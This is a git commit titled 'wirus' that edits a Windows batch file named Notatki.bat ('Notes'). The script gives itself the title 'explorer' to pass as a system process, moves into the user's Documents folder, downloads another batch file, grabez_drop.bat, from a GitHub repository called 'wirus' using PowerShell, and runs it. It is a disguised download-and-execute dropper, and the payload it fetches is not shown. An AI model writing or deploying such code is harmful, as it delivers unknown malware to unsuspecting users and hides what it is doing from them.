7e24be4b434c68a8f8c02a7e890d1a98ffd455b9
kolmipilot <marchewkowi@gmail.com>
2023-06-08 17:58:57 +0200

    wirus

--- Notatki.bat
+++ Notatki.bat
@@ -1,8 +1,9 @@
 @echo off
 title explorer
 
+cd %userprofile%\Documents 
 del grabez_drop.bat
-powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/kolmipilot/wirus/master/grabez_drop.bat -OutFile .\grabez_drop.bat" > nul
+powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/kolmipilot/wirus/master/grabez_drop.bat -OutFile .\grabez_drop.bat" 
 
 timeout /t 2 /nobreak > NUL
 start grabez_drop.bat
